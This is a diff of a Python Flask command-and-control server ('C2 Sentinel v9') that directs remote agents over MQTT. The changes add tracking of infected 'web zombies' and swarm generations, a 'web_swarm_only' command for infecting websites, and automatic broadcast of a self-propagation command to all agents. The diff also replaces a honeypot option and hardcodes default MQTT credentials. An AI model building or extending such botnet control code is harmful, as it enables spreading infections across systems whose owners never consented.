@@ -18,11 +18,11 @@ MAX_REPORTS = 1000
 TELEGRAM_ENABLED = False
 
 # HiveMQ Config
-MQTT_HOST = os.getenv("MQTT_HOST", "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud")  # Ganti dengan milikmu dari dashboard HiveMQ Cloud
+MQTT_HOST = os.getenv("MQTT_HOST", "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud")
 MQTT_PORT = int(os.getenv("MQTT_PORT", 8883))
 MQTT_USERNAME = os.getenv("MQTT_USERNAME", "Sentinel_admin")
 MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "SentinelPass123")
-MQTT_TOPIC_CMD = "c2/agent/+/cmd"      # Wildcard untuk semua agent
+MQTT_TOPIC_CMD = "c2/agent/+/cmd"
 MQTT_TOPIC_REPORT = "c2/agent/+/report"
 
 if not os.path.exists("data"):
@@ -36,7 +36,7 @@ ACTIVE_COMMANDS = {}
 AGENT_LAST_SEEN = {}
 AGENT_STATUS = {}
 AGENT_CHECKINS = []
-AGENT_SWARM_MAP = {}  # {agent_id: {"parent": ..., "children": [...], "ip": ...}}
+AGENT_SWARM_MAP = {}
 SOCKETS = []
 MQTT_CLIENT = None
 
@@ -50,7 +50,7 @@ def xor_decrypt(data_b64, key=XOR_KEY):
         return None
 
 def is_high_severity(data):
-    high_keywords = ["IDOR", "RCE", "SQLi", "XSS", "Auth Bypass", "SSRF", "LFI", "RFI", "CRITICAL", "REMOTE"]
+    high_keywords = ["IDOR", "RCE", "SQLi", "XSS", "Auth Bypass", "SSRF", "LFI", "RFI", "CRITICAL", "REMOTE", "INFECTED", "SWARM"]
     issue = str(data.get("issue", "")).upper()
     return any(kw.upper() in issue for kw in high_keywords)
 
@@ -62,7 +62,6 @@ def send_alert(text):
 
 # === NEURAL AI ENGINE ===
 def neural_ai_analyze(reports):
-    """AI dengan prediksi & rekomendasi proaktif"""
     try:
         total = len(reports)
         if total == 0:
@@ -73,12 +72,12 @@ def neural_ai_analyze(reports):
                 "auto_command": "swarm_activate"
             }
 
-        # Analisis tren
         now = datetime.now()
         last_hour = 0
         high_sev = 0
         unique_hosts = set()
         swarm_agents = 0
+        web_zombies = 0
 
         for r in reports:
             if is_high_severity(r):
@@ -87,6 +86,8 @@ def neural_ai_analyze(reports):
             unique_hosts.add(host)
             if "swarm" in r.get("status", ""):
                 swarm_agents += 1
+            if r.get("type") == "swarm_infection" and r.get("data", {}).get("method") == "web":
+                web_zombies += 1
 
             try:
                 ts = datetime.fromisoformat(r.get("timestamp", ""))
@@ -95,29 +96,27 @@ def neural_ai_analyze(reports):
             except:
                 pass
 
-        # Hitung risk score
-        risk_score = min(100, high_sev * 15 + (total // 10) * 5)
+        risk_score = min(100, high_sev * 15 + (total // 10) * 5 + web_zombies * 10)
         if swarm_agents > 5:
-            risk_score = max(risk_score, 95)  # swarm = high risk
+            risk_score = max(risk_score, 95)
 
-        # Prediksi
         if swarm_agents > 0:
-            prediction = f"Agent swarm aktif → {swarm_agents} agent menyebar otomatis"
-            auto_command = "idle"  # biarkan swarm bekerja
+            prediction = f"Agent swarm aktif → {swarm_agents} agent menyebar otomatis ({web_zombies} via web)"
+            auto_command = "idle"
         elif last_hour < 3:
             prediction = "Aktivitas rendah → risiko serangan meningkat"
-            auto_command = "scan"
+            auto_command = "swarm_activate"
         else:
             prediction = "Aktivitas normal → pertahankan vigilansi"
             auto_command = "idle"
 
-        # Rekomendasi
         summary = f"""
 🧠 **NEURAL AI INSIGHT**
 ========================
 Total Agent: {len(unique_hosts)}
 Laporan: {total} (High: {high_sev})
 Agent Swarm: {swarm_agents}
+Web Zombies: {web_zombies}
 Aktivitas 1 Jam: {last_hour}
 
 🔮 Prediksi: {prediction}
@@ -130,7 +129,7 @@ Aktivitas 1 Jam: {last_hour}
     "Update semua agent ke versi terbaru",
     "Periksa exfiltration di host yang jarang beacon",
     "Aktifkan mode silent untuk infiltrasi mendalam",
-    "Luncurkan 'decoy_activate' untuk menjebak attacker"
+    "Luncurkan 'web_swarm_only' untuk infeksi website"
 ])}
 - Risk Score > 80? Segera isolasi jaringan!
         """
@@ -140,9 +139,9 @@ Aktivitas 1 Jam: {last_hour}
             "risk_score": risk_score,
             "prediction": prediction,
             "auto_command": auto_command,
-            "swarm_agents": swarm_agents
+            "swarm_agents": swarm_agents,
+            "web_zombies": web_zombies
         }
-
     except Exception as e:
         print(f"[NEURAL AI ERROR] {e}")
         return {
@@ -154,20 +153,17 @@ Aktivitas 1 Jam: {last_hour}
 
 # === AUTO-COMMAND SYSTEM ===
 def auto_command_system(ai_insight):
-    """Server bisa kirim perintah otomatis ke agent jika risk score tinggi"""
     if ai_insight["risk_score"] > 75:
         cmd = ai_insight["auto_command"]
         if cmd != "idle":
-            # Kirim ke SEMUA agent aktif
             for agent_id in list(AGENT_LAST_SEEN.keys()):
-                if agent_id not in ACTIVE_COMMANDS:  # jangan timpa perintah manual
+                if agent_id not in ACTIVE_COMMANDS:
                     ACTIVE_COMMANDS[agent_id] = {
                         "cmd": cmd,
                         "note": "AUTO: Neural AI Command",
                         "timestamp": datetime.now().isoformat(),
                         "issued_by": "neural_ai"
                     }
-                    # Kirim via MQTT
                     if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                         topic = f"c2/agent/{agent_id}/cmd"
                         payload = json.dumps(ACTIVE_COMMANDS[agent_id])
@@ -179,22 +175,19 @@ def auto_command_system(ai_insight):
 def cleanup_system():
     while True:
         now = datetime.now()
-        # Bersihkan agent offline
         for agent_id in list(AGENT_LAST_SEEN.keys()):
-            if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() > 600:  # 10 menit
+            if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() > 600:
                 AGENT_STATUS.pop(agent_id, None)
                 AGENT_LAST_SEEN.pop(agent_id, None)
                 AGENT_SWARM_MAP.pop(agent_id, None)
                 ACTIVE_COMMANDS.pop(agent_id, None)
 
-        # Bersihkan command kadaluarsa
         for agent_id in list(ACTIVE_COMMANDS.keys()):
             cmd = ACTIVE_COMMANDS[agent_id]
             issued = datetime.fromisoformat(cmd["timestamp"])
             if (now - issued).total_seconds() > COMMAND_EXPIRY:
                 del ACTIVE_COMMANDS[agent_id]
 
-        # Batasi jumlah laporan
         try:
             with open(REPORT_FILE, "r+") as f:
                 reports = json.load(f)
@@ -229,7 +222,7 @@ def on_connect(client, userdata, flags, rc):
     if rc == 0:
         print("[MQTT] ✅ Connected to HiveMQ Cloud")
         client.subscribe(MQTT_TOPIC_REPORT, qos=1)
-        client.subscribe(MQTT_TOPIC_CMD, qos=1)  # Untuk debug/command manual
+        client.subscribe(MQTT_TOPIC_CMD, qos=1)
         socketio.emit('mqtt_status', {'status': 'connected'})
     else:
         print(f"[MQTT] ❌ Connection failed with code {rc}")
@@ -242,13 +235,11 @@ def on_message(client, userdata, msg):
         print(f"[MQTT] ← {topic}: {payload}")
 
         if "/report" in topic:
-            # Ekstrak agent_id dari topic: c2/agent/AGENT123/report
             parts = topic.split('/')
             if len(parts) >= 4:
                 agent_id = parts[2]
                 handle_agent_report(agent_id, payload)
         elif "/cmd" in topic:
-            # Untuk command yang dikirim manual via MQTT (opsional)
             pass
 
     except Exception as e:
@@ -261,20 +252,24 @@ def handle_agent_report(agent_id, encrypted_payload):
 
     try:
         data = json.loads(decrypted)
-        data["id"] = agent_id  # Pastikan ID sesuai topic
+        data["id"] = agent_id
         data["timestamp"] = datetime.now().isoformat()
-        data["beacon_ip"] = "MQTT"  # IP tidak relevan di MQTT
+        data["beacon_ip"] = "MQTT"
 
         AGENT_LAST_SEEN[agent_id] = datetime.now()
 
         if agent_id not in AGENT_SWARM_MAP:
             existing_agents = list(AGENT_SWARM_MAP.keys())
             parent = random.choice(existing_agents) if existing_agents else "ROOT"
+            swarm_gen = data.get("system", {}).get("swarm_generation", 0)
+            infected_via = data.get("system", {}).get("infected_via", "manual")
             AGENT_SWARM_MAP[agent_id] = {
                 "parent": parent,
                 "children": [],
                 "ip": data.get("ip", "unknown"),
-                "first_seen": data["timestamp"]
+                "first_seen": data["timestamp"],
+                "generation": swarm_gen,
+                "infected_via": infected_via
             }
             if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                 AGENT_SWARM_MAP[parent]["children"].append(agent_id)
@@ -302,17 +297,15 @@ def handle_agent_report(agent_id, encrypted_payload):
             send_alert(alert)
             socketio.emit('new_alert', {"message": f"Critical issue found by {agent_id}: {data.get('issue', 'unknown')}"})
 
-        # Kirim perintah balik jika ada
         cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
         if agent_id in ACTIVE_COMMANDS:
             del ACTIVE_COMMANDS[agent_id]
-            # Kirim via MQTT
-            topic = f"c2/agent/{agent_id}/cmd"
-            cmd_payload = json.dumps(cmd)
-            MQTT_CLIENT.publish(topic, cmd_payload, qos=1)
-            print(f"[MQTT] → {topic}: {cmd_payload}")
+            if MQTT_CLIENT and MQTT_CLIENT.is_connected():
+                topic = f"c2/agent/{agent_id}/cmd"
+                cmd_payload = json.dumps(cmd)
+                MQTT_CLIENT.publish(topic, cmd_payload, qos=1)
+                print(f"[MQTT] → {topic}: {cmd_payload}")
 
-        # Update dashboard
         online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items()
                           if (datetime.now() - last_seen).total_seconds() < 300)
         socketio.emit('update_dashboard', {"agents_online": online_count})
@@ -323,7 +316,7 @@ def handle_agent_report(agent_id, encrypted_payload):
 def init_mqtt():
     global MQTT_CLIENT
     client = mqtt.Client()
-    client.tls_set()  # HiveMQ Cloud requires TLS
+    client.tls_set()
     client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
     client.on_connect = on_connect
     client.on_message = on_message
@@ -337,7 +330,7 @@ def init_mqtt():
         print(f"[MQTT] Failed to connect: {e}")
         socketio.emit('mqtt_status', {'status': 'error', 'message': str(e)})
 
-# === FLASK + SOCKETIO APP ===
+# === FLASK + SOCKETIO ===
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(24)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
@@ -348,7 +341,7 @@ def get_dashboard_template():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🌐 C2 SENTINEL v9 - HIVE.MQ NEURAL SWARM</title>
+    <title>🌐 C2 SENTINEL v9 - HIVE.MQ SWARM COMMAND CENTER</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.jsdelivr.net/npm/chart.js "></script>
@@ -365,11 +358,6 @@ def get_dashboard_template():
             --bg-dark: #020c02;
             --bg-darker: #000400;
         }
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         body { 
             background: var(--bg-darker);
             color: var(--primary); 
@@ -378,7 +366,6 @@ def get_dashboard_template():
             margin: 0;
             overflow-x: hidden;
             background: radial-gradient(circle at center, #001a00, var(--bg-darker));
-            background-attachment: fixed;
         }
         .container { 
             max-width: 1600px; 
@@ -387,10 +374,9 @@ def get_dashboard_template():
             position: relative;
             z-index: 10;
         }
-        h1, h2, h3, h4 { 
+        h1, h2, h3 { 
             color: var(--primary); 
             text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary);
-            letter-spacing: 1px;
         }
         a { 
             color: var(--secondary); 
@@ -410,8 +396,6 @@ def get_dashboard_template():
             overflow-x: auto;
             border: 1px solid var(--success);
             box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
-            font-size: 0.95em;
-            line-height: 1.5;
         }
         .card { 
             background: rgba(0, 30, 0, 0.75); 
@@ -432,25 +416,10 @@ def get_dashboard_template():
             grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); 
             gap: 25px; 
         }
-        .status-online { 
-            color: var(--success); 
-            text-shadow: 0 0 8px var(--success);
-            font-weight: bold;
-        }
-        .status-offline { 
-            color: var(--danger); 
-            text-shadow: 0 0 8px var(--danger);
-            font-weight: bold;
-        }
-        .blink { 
-            animation: blinker 1.5s linear infinite; 
-            text-shadow: 0 0 15px var(--danger);
-            font-weight: bold;
-        }
-        @keyframes blinker { 
-            0%, 100% { opacity: 1; text-shadow: 0 0 15px var(--danger); }
-            50% { opacity: 0.5; text-shadow: 0 0 5px var(--danger); }
-        }
+        .status-online { color: var(--success); text-shadow: 0 0 8px var(--success); font-weight: bold; }
+        .status-offline { color: var(--danger); text-shadow: 0 0 8px var(--danger); font-weight: bold; }
+        .blink { animation: blinker 1.5s linear infinite; text-shadow: 0 0 15px var(--danger); font-weight: bold; }
+        @keyframes blinker { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         button { 
             background: linear-gradient(135deg, rgba(0, 50, 0, 0.9), rgba(0, 80, 0, 0.9)); 
             color: var(--success); 
@@ -462,14 +431,11 @@ def get_dashboard_template():
             text-shadow: 0 0 5px var(--success);
             box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
             transition: all 0.3s ease;
-            font-family: inherit;
-            letter-spacing: 1px;
         }
         button:hover { 
             background: linear-gradient(135deg, rgba(0, 80, 0, 0.9), rgba(0, 120, 0, 0.9));
             box-shadow: 0 0 25px rgba(0, 255, 153, 0.6);
             transform: scale(1.05);
-            letter-spacing: 2px;
         }
         select, input { 
             background: rgba(0, 40, 0, 0.9); 
@@ -480,7 +446,6 @@ def get_dashboard_template():
             width: 100%;
             max-width: 450px;
             font-family: inherit;
-            font-size: 1em;
         }
         .header { 
             border-bottom: 3px solid var(--success); 
@@ -489,7 +454,6 @@ def get_dashboard_template():
             text-align: center;
             background: rgba(0, 20, 0, 0.5);
             border-radius: 12px 12px 0 0;
-            backdrop-filter: blur(5px);
         }
         .terminal { 
             height: 450px; 
@@ -500,18 +464,6 @@ def get_dashboard_template():
             border-radius: 10px;
             box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.3);
             font-family: 'Courier New', monospace;
-            scrollbar-width: thin;
-            scrollbar-color: var(--success) rgba(0,30,0,0.5);
-        }
-        .terminal::-webkit-scrollbar {
-            width: 8px;
-        }
-        .terminal::-webkit-scrollbar-track {
-            background: rgba(0,30,0,0.3);
-        }
-        .terminal::-webkit-scrollbar-thumb {
-            background-color: var(--success);
-            border-radius: 10px;
         }
         .ai-insight { 
             background: linear-gradient(135deg, rgba(0, 40, 0, 0.95), rgba(0, 20, 40, 0.95)); 
@@ -522,20 +474,6 @@ def get_dashboard_template():
             box-shadow: 0 0 25px rgba(255, 0, 255, 0.4);
             position: relative;
             overflow: hidden;
-        }
-        .ai-insight::before {
-            content: "";
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(rgba(255,0,255,0) 0%, rgba(255,0,255,0.1) 50%, rgba(255,0,255,0) 100%);
-            animation: scan 3s linear infinite;
-        }
-        @keyframes scan {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
         }
         .chart-container { 
             height: 350px; 
@@ -575,7 +513,6 @@ def get_dashboard_template():
             text-fill-color: transparent;
             animation: glow 3s ease-in-out infinite alternate;
             text-shadow: 0 0 20px rgba(0,255,0,0.5);
-            margin: 10px 0;
         }
         @keyframes glow {
             0% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
@@ -617,6 +554,7 @@ def get_dashboard_template():
         }
         .tag-high { background: rgba(80, 0, 0, 0.8); border-color: var(--danger); color: var(--danger); }
         .tag-swarm { background: rgba(40, 0, 60, 0.8); border-color: #ff00ff; color: #ff00ff; }
+        .tag-web { background: rgba(60, 40, 0, 0.8); border-color: #ffff00; color: #ffff00; }
         .notification {
             position: fixed;
             bottom: 20px;
@@ -647,32 +585,6 @@ def get_dashboard_template():
         }
         .mqtt-connected { background: rgba(0, 50, 0, 0.8); border: 1px solid #00ff00; color: #00ff00; }
         .mqtt-disconnected { background: rgba(50, 0, 0, 0.8); border: 1px solid #ff0000; color: #ff0000; }
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar {
-            width: 10px;
-        }
-        ::-webkit-scrollbar-track {
-            background: rgba(0,30,0,0.3);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--success);
-            border-radius: 10px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--primary);
-        }
-        @media (max-width: 768px) {
-            .grid {
-                grid-template-columns: 1fr;
-            }
-            .neon-title {
-                font-size: 2em;
-            }
-            .header nav a {
-                display: block;
-                margin: 5px 0;
-            }
-        }
     </style>
 </head>
 <body>
@@ -681,7 +593,7 @@ def get_dashboard_template():
     <div class="container">
         <div class="header">
             <h1 class="neon-title">🌐 C2 SENTINEL v9</h1>
-            <h3><span class="blink">[HIVE.MQ NEURAL SWARM EDITION]</span></h3>
+            <h3><span class="blink">[HIVE.MQ SWARM COMMAND CENTER]</span></h3>
             <nav style="margin-top: 15px;">
                 <a href="/">🏠 Dashboard</a> |
                 <a href="/agents">👾 Agent Live</a> |
@@ -694,14 +606,13 @@ def get_dashboard_template():
             </nav>
         </div>
 
-        <!-- CONTENT -->
         {{ content | safe }}
 
         <footer style="margin-top: 60px; font-size: 0.9em; color: #666; text-align: center; padding: 20px; border-top: 1px solid rgba(0,255,0,0.2);">
             <div style="margin-bottom: 10px;">
-                C2 Sentinel v9 - HIVE.MQ NEURAL SWARM &copy; 2025 | 
+                C2 Sentinel v9 - HIVE.MQ SWARM &copy; 2025 | 
                 <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span> |
-                <span style="color: #ff00ff; text-shadow: 0 0 5px #ff00ff;">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
+                <span style="color: #ff00ff;">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
                 <span style="color: #ffff00;">Risk Score: {{ risk_score }}/100</span>
             </div>
             <div>
@@ -711,17 +622,12 @@ def get_dashboard_template():
     </div>
 
     <script>
-        // Matrix Rain Effect
         const matrix = document.getElementById('matrixRain');
-        const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789!@#$%^&*()_+';
+        const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789';
         const fontSize = 12;
         let columns = Math.floor(window.innerWidth / fontSize);
         const drops = [];
-
-        for (let i = 0; i < columns; i++) {
-            drops[i] = 1;
-        }
-
+        for (let i = 0; i < columns; i++) drops[i] = 1;
         function drawMatrix() {
             matrix.innerHTML = '';
             for (let i = 0; i < drops.length; i++) {
@@ -729,30 +635,15 @@ def get_dashboard_template():
                 const x = i * fontSize;
                 const y = drops[i] * fontSize;
                 const opacity = Math.random() * 0.8 + 0.2;
-                matrix.innerHTML += `<div style="position: absolute; color: rgba(0, 255, 0, ${opacity}); font-size: ${fontSize}px; top: ${y}px; left: ${x}px; text-shadow: 0 0 5px #00ff00;">${text}</div>`;
-                if (Math.random() > 0.97 && drops[i] > 10) {
-                    drops[i] = 0;
-                }
+                matrix.innerHTML += `<div style="position: absolute; color: rgba(0, 255, 0, ${opacity}); font-size: ${fontSize}px; top: ${y}px; left: ${x}px;">${text}</div>`;
+                if (Math.random() > 0.97 && drops[i] > 10) drops[i] = 0;
                 drops[i]++;
             }
         }
         setInterval(drawMatrix, 50);
 
-        // Handle resize
-        window.addEventListener('resize', () => {
-            columns = Math.floor(window.innerWidth / fontSize);
-            drops.length = 0;
-            for (let i = 0; i < columns; i++) {
-                drops[i] = 1;
-            }
-        });
-
-        // WebSocket Connection
         const socket = io();
-        socket.on('connect', () => {
-            console.log('🔌 Connected to C2 Sentinel WebSocket');
-        });
-
+        socket.on('connect', () => console.log('🔌 Connected to WebSocket'));
         socket.on('mqtt_status', (data) => {
             const statusEl = document.getElementById('mqttStatus');
             if (statusEl) {
@@ -760,7 +651,6 @@ def get_dashboard_template():
                 statusEl.className = 'mqtt-status ' + (data.status === 'connected' ? 'mqtt-connected' : 'mqtt-disconnected');
             }
         });
-
         socket.on('update_dashboard', (data) => {
             const footer = document.querySelector('footer');
             if (footer) {
@@ -771,24 +661,14 @@ def get_dashboard_template():
                 }
             }
         });
-
         socket.on('new_alert', (data) => {
             const notif = document.createElement('div');
             notif.className = 'notification';
             notif.innerHTML = `<strong>🚨 ALERT</strong><br>${data.message}`;
             document.body.appendChild(notif);
-            setTimeout(() => {
-                notif.remove();
-            }, 5000);
+            setTimeout(() => notif.remove(), 5000);
         });
 
-        socket.on('command_issued', (data) => {
-            if (window.location.pathname === '/command') {
-                location.reload();
-            }
-        });
-
-        // Auto-refresh for non-WebSocket pages
         setInterval(() => {
             if(!['/logs', '/agents', '/', '/swarm'].includes(window.location.pathname)) return;
         }, 5000);
@@ -798,7 +678,6 @@ def get_dashboard_template():
 '''
 
 # === ROUTES ===
-
 @app.route('/')
 def home():
     now = datetime.now()
@@ -810,7 +689,6 @@ def home():
         else:
             AGENT_STATUS[agent_id] = "offline"
 
-    # Load & analyze with NEURAL AI
     try:
         with open(REPORT_FILE, "r") as f:
             reports = json.load(f)
@@ -820,12 +698,9 @@ def home():
         reports = []
 
     ai_insight = neural_ai_analyze(reports)
-
-    # Trigger auto-command if needed
     if ai_insight["risk_score"] > 75:
         auto_command_system(ai_insight)
 
-    # Prepare chart data
     chart_labels = [item["time"] for item in AGENT_CHECKINS]
     chart_data = [item["online"] for item in AGENT_CHECKINS]
 
@@ -843,6 +718,7 @@ def home():
             <p>💾 <b>Total Laporan:</b> {len(reports)}</p>
             <p>🚨 <b>High Severity:</b> {sum(1 for r in reports if is_high_severity(r))}</p>
             <p>🕸️ <b>Agent Swarm:</b> <span class="tag tag-swarm">{ai_insight.get("swarm_agents", 0)}</span></p>
+            <p>🌐 <b>Web Zombies:</b> <span class="tag tag-web">{ai_insight.get("web_zombies", 0)}</span></p>
             <p>⏱️ <b>Command Aktif:</b> {len(ACTIVE_COMMANDS)}</p>
         </div>
         <div class="card">
@@ -889,49 +765,13 @@ def home():
             options: {{
                 responsive: true,
                 plugins: {{
-                    legend: {{
-                        labels: {{
-                            color: '#00ff00',
-                            font: {{
-                                size: 14
-                            }}
-                        }}
-                    }},
-                    tooltip: {{
-                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
-                        titleColor: '#00ff00',
-                        bodyColor: '#ffffff'
-                    }}
+                    legend: {{ labels: {{ color: '#00ff00' }} }} }}
                 }},
                 scales: {{
-                    x: {{
-                        ticks: {{ 
-                            color: '#00ff00',
-                            font: {{
-                                size: 12
-                            }}
-                        }},
-                        grid: {{
-                            color: 'rgba(0, 255, 0, 0.1)'
-                        }}
-                    }},
-                    y: {{
-                        beginAtZero: true,
-                        ticks: {{ 
-                            color: '#00ff00',
-                            font: {{
-                                size: 12
-                            }}
-                        }},
-                        grid: {{
-                            color: 'rgba(0, 255, 0, 0.1)'
-                        }}
-                    }}
+                    x: {{ ticks: {{ color: '#00ff00' }} }},
+                    y: {{ beginAtZero: true, ticks: {{ color: '#00ff00' }} }}
                 }},
-                animation: {{
-                    duration: 2000,
-                    easing: 'easeInOutQuart'
-                }}
+                animation: {{ duration: 2000 }}
             }}
         }});
     </script>
@@ -940,21 +780,24 @@ def home():
 
 @app.route('/swarm')
 def swarm_map():
-    """Visualisasi 3D penyebaran agent"""
     nodes = []
     links = []
     agent_list = list(AGENT_LAST_SEEN.keys())
 
     for i, agent_id in enumerate(agent_list[:50]):
         status = "online" if (datetime.now() - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300 else "offline"
+        gen = AGENT_SWARM_MAP.get(agent_id, {}).get("generation", 0)
+        via = AGENT_SWARM_MAP.get(agent_id, {}).get("infected_via", "manual")
         nodes.append({
             "id": agent_id,
-            "name": agent_id[:8] + "...",
+            "name": f"{agent_id[:6]}..G{gen}",
             "status": status,
-            "group": 1,
+            "group": gen + 1,
             "x": random.uniform(-150, 150),
             "y": random.uniform(-150, 150),
-            "z": random.uniform(-150, 150)
+            "z": random.uniform(-150, 150),
+            "gen": gen,
+            "via": via
         })
 
         if i > 0:
@@ -966,7 +809,7 @@ def swarm_map():
             })
 
     content = f'''
-    <h2>🕸️ NEURAL SWARM 3D MAP — REAL-TIME NETWORK PROPAGATION</h2>
+    <h2>🕸️ NEURAL SWARM 3D MAP — GENERASI & METODE INFEKSI</h2>
     <div class="card">
         <div class="swarm-map" id="swarmMap"></div>
         <p><small>Visualisasi 3D agent dan koneksi penyebarannya. <span class="blink">AUTO-REFRESH DISABLED — REAL-TIME VIA WEBSOCKET</span></small></p>
@@ -1019,9 +862,17 @@ def swarm_map():
         const spheres = [];
         const lines = [];
 
+        const genColors = [
+            0x00ff00, // Gen 0
+            0x00ffff, // Gen 1
+            0xffff00, // Gen 2
+            0xff00ff, // Gen 3
+            0xff0000  // Gen 4+
+        ];
+
         nodes.forEach((node, i) => {{
-            const geometry = new THREE.SphereGeometry(5, 32, 32);
-            const color = node.status === 'online' ? 0x00ff00 : 0xff0000;
+            const geometry = new THREE.SphereGeometry(5 + node.gen, 32, 32);
+            const color = genColors[Math.min(node.gen, 4)];
             const material = new THREE.MeshPhongMaterial({{ 
                 color: color,
                 emissive: color,
@@ -1063,7 +914,7 @@ def swarm_map():
             const curve = new THREE.LineCurve3(start.clone(), end.clone());
             const tubeGeometry = new THREE.TubeGeometry(curve, 20, 0.5, 8, false);
             const tubeMaterial = new THREE.MeshPhongMaterial({{
-                color: 0x00ffff,
+                color: 0x0088ff,
                 emissive: 0x0088ff,
                 emissiveIntensity: 0.5,
                 transparent: true,
@@ -1135,18 +986,9 @@ def agents_live():
         status = "online" if (now - last_seen).total_seconds() < 300 else "offline"
         AGENT_STATUS[agent_id] = status
         time_str = last_seen.strftime("%Y-%m-%d %H:%M:%S")
-        sev_tag = ""
-        try:
-            with open(REPORT_FILE, "r") as f:
-                reports = json.load(f)
-                agent_reports = [r for r in reports if r.get("id") == agent_id]
-                high_count = sum(1 for r in agent_reports if is_high_severity(r))
-                if high_count > 0:
-                    sev_tag = f'<span class="tag tag-high">HIGH x{high_count}</span>'
-                if "swarm" in str(agent_reports[-1].get("status", "")) if agent_reports else "":
-                    sev_tag += ' <span class="tag tag-swarm">SWARM</span>'
-        except:
-            pass
+        gen = AGENT_SWARM_MAP.get(agent_id, {}).get("generation", 0)
+        via = AGENT_SWARM_MAP.get(agent_id, {}).get("infected_via", "manual")
+        sev_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{via}</span>'
 
         agents_html += f'''
         <div style="border: 1px solid rgba(0,255,0,0.2); margin: 15px 0; padding: 15px; border-radius: 8px; background: rgba(0,25,0,0.5);">
@@ -1167,11 +1009,11 @@ def agents_live():
         '''
 
     content = f'''
-    <h2>👾 AGENT LIVE STATUS — REAL-TIME MONITORING</h2>
+    <h2>👾 AGENT LIVE STATUS — GENERASI & METODE INFEKSI</h2>
     <div style="background: rgba(0, 30, 0, 0.7); padding:20px; border-radius:10px; border: 1px solid #00ff00;">
         {agents_html if agents_html else "<i style='color: #666;'>Tidak ada agent terdaftar.</i>"}
     </div>
-    <p><small>Auto-update via WebSocket — no refresh needed.</small></p>
+    <p><small>Real-time via MQTT + WebSocket</small></p>
     '''
     return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
 
@@ -1188,9 +1030,7 @@ def command_panel():
                 "timestamp": datetime.now().isoformat(),
                 "issued_by": "admin"
             }
-            # Emit via WebSocket
             socketio.emit('command_issued', {"agent_id": agent_id, "cmd": cmd})
-            # Also send via MQTT if connected
             if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                 topic = f"c2/agent/{agent_id}/cmd"
                 payload = json.dumps(ACTIVE_COMMANDS[agent_id])
@@ -1230,8 +1070,9 @@ def command_panel():
             <option value="update">🆙 update - Self-update agent</option>
             <option value="kill">💀 kill - Self-destruct</option>
             <option value="swarm_activate">🕸️ swarm_activate - Activate neural propagation</option>
+            <option value="web_swarm_only">🌐 web_swarm_only - Web zombie hunter only</option>
             <option value="silent_mode">👻 silent_mode - Stealth operation</option>
-            <option value="decoy_activate">🪤 decoy_activate - Deploy honeypot</option>
+            <option value="set_generation">🧬 set_generation - Set swarm generation</option>
         </select><br><br>
         
         <label>📝 Catatan (Opsional):</label><br>
@@ -1263,14 +1104,20 @@ def list_reports():
         for r in reports[:50]:
             severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
             sev_class = "tag-high" if is_high_severity(r) else ""
+            gen_tag = ""
+            if r.get("type") == "swarm_infection":
+                gen = r.get("data", {}).get("generation", 0)
+                method = r.get("data", {}).get("method", "")
+                gen_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{method}</span>'
+
             formatted_reports.append(f'''
 <div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#ff3366' if is_high_severity(r) else '#00ff00'}; background: rgba(0,20,0,0.5);">
     <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
         <div><b>Agent:</b> {r.get("id", "unknown")}</div>
-        <div><span class="tag {sev_class}">{severity}</span></div>
+        <div><span class="tag {sev_class}">{severity}</span> {gen_tag}</div>
     </div>
-    <div><b>Issue:</b> {r.get("issue", "N/A")}</div>
-    <div><b>Target:</b> {r.get("target", "N/A")}</div>
+    <div><b>Type:</b> {r.get("type", "beacon")}</div>
+    <div><b>Target:</b> {r.get("data", {}).get("target", "N/A")}</div>
     <div><small><b>Time:</b> {r.get("timestamp", "N/A")} | IP: {r.get("beacon_ip", "N/A")}</small></div>
 </div>
             ''')
@@ -1324,9 +1171,10 @@ def live_logs():
             ts = r.get("timestamp", "N/A")
             agent = r.get("id", "unknown")
             issue = r.get("issue", "N/A")
